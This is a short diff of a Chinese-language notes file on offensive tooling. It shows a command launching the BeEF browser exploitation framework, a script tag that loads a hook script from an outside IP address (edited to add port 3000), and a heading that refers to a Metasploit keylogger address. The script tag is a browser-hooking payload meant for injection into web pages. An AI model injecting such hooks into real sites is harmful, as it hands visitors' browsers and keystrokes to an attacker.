@@ -26,7 +26,7 @@ nohup /usr/share/beef-xss/beef &
 ```
 在网站外部使用
 ```javascript
-<script src="139.162.69.124/hokasa.js"> </script>
+<script src="139.162.69.124:3000/hokasa.js"> </script>
 ```
 
 # msf的keylogger的地址
